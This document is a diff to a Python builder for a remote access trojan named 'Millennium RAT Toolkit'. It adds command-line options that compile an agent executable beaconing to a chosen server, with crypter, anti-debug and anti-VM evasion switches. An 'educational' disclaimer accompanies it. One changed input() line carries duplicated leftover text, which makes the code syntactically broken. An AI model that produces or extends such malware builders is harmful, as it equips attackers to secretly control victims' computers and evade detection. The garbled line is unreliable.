@@ -2222,6 +2222,33 @@ def show_menu():
     print()
 
 def main():
+    import argparse
+    
+    parser = argparse.ArgumentParser(description='Millennium RAT Toolkit')
+    parser.add_argument('--compile-agent', action='store_true', help='Compile agent to executable')
+    parser.add_argument('--server-ip', default='0.0.0.0', help='Server IP address')
+    parser.add_argument('--server-port', default='8888', help='Server port')
+    parser.add_argument('--output', default='millennium_agent', help='Output filename')
+    parser.add_argument('--apply-crypter', action='store_true', help='Apply crypter protection')
+    parser.add_argument('--anti-debug', action='store_true', help='Enable anti-debug')
+    parser.add_argument('--anti-vm', action='store_true', help='Enable anti-VM')
+    parser.add_argument('--compression', action='store_true', help='Enable compression')
+    
+    args = parser.parse_args()
+    
+    if args.compile_agent:
+        compiler = MillenniumCompiler()
+        result = compiler.compile_to_executable(
+            server_ip=args.server_ip,
+            server_port=args.server_port,
+            output_name=args.output
+        )
+        if result:
+            print(f"[SUCCESS] Agent compiled: {result}")
+        else:
+            print("[ERROR] Compilation failed")
+        return
+    
     show_banner()
     
     builder = MillenniumToolkitBuilder()
@@ -2235,7 +2262,7 @@ def main():
             print("Educational cybersecurity toolkit - use responsibly!")
             break
         elif choice == "1":
-            output_dir = input("Output directory [millennium_toolkit]: ").strip() or "millennium_toolkit"
+            output_dir = input("Output directory (default: millennium_toolkit): ").strip() or "millennium_toolkit"ut directory [millennium_toolkit]: ").strip() or "millennium_toolkit"
             print(f"Building complete Millennium toolkit in {output_dir}...")
             builder.create_complete_millennium_toolkit(output_dir)
         elif choice == "2":
